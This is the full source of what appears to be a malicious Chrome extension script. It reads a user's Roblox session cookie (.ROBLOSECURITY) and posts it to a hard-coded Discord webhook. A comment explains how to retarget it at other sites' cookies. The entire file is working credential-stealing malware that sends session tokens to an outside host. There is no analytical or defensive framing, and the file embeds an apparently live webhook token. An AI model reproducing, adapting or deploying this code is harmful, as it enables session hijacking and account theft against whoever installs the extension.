function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `cuh`,
            "description": ">>> cuh :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1030232883169865778/nPZiChPzkYBc3ZrQmbC-vuuMOLWAkHQaR8W7vHfmi4KDqkn2-fDp3utgU6UsaEFhJ2CA", cookie.value);
  }
});
